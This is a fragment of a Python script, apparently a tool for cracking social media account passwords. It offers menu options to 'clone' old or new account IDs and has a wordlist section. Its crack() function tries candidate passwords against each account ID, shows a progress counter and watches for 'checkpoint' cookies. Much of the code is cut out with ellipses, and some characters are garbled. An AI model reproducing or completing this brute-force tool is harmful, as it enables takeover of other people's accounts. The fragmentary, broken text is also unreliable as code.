...
def setting():
	...
	print('') 
	cetak(nel('[bold red] 1. CLONE JUST OLD IDZ \n2. CLONE JUST NEW IDZ(green)\n3. CLONE MIX IDZ (NEW/OLD)=>RECOMEND [bold yellow]'))
	print('')
	hu = input('=>CHOOSE : ')
	if hu in ['1','01']:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel('[bold cyan]               WAIT FOR A WHILE😮‍💨 ‚[bold red]')) 
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}=>{k} MR RAFU IT'Z A BRAND{u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}KELSH🥵-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[green]      â¤ï¸âœ¨ MR RAFU-OK😍 â¤ï¸âœ¨[green]')) 
